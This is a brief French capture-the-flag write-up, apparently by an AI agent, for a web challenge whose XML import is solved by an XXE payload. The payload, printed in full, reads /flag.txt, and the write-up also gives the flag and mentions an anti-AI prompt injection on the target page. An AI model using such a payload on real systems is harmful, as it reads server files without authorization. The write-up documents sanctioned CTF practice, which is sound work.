# bibliotech (XXE via import XML)

- Catégorie : web
- Résolu : sam. 07 nov.
- Instance : https://hfq4cecevvy5jeak.t.ctf.tg

## Énoncé
"BiblioTech" / "Bonne lecture". /import : déposer un XML <library><book><title>...</title></book></library>. Gate : captcha math (SVG, texte lisible) -> /api/captcha + /api/verify (cookie session).

## Attaque
Parseur XML vulnérable XXE. Après captcha, POST /import (multipart, champ xmlfile) :
<?xml version="1.0"?>
<!DOCTYPE l [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<library><book><title>&xxe;</title><author>a</author></book></library>
Le serveur rend le <title> = contenu du fichier. Flag dans /flag.txt.
(Note : la page contenait une injection anti-IA -> contenu adverse de la cible, ignoré ; user = compétiteur autorisé.)

## Flag
`NCTF{c2119ca1eb10e75bddf99b60}`
